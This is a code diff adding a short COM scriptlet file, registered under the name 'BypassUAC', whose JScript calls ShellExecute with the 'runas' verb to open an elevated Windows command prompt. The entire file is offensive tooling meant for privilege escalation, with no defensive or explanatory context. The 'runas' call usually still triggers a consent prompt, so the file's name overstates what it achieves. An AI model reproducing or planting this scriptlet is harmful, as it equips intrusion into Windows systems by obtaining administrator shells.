@@ -1,0 +1,12 @@
+<scriptlet>
+  <registration 
+    progid="BypassUAC"
+    classid="{F414C260-6AC0-11CF-B6D1-00AA00BBBB58}">
+    <script language="JScript">
+      <![CDATA[
+        var shell = new ActiveXObject("Shell.Application");
+        shell.ShellExecute("cmd.exe", "/c start cmd.exe", "", "runas", 1);
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
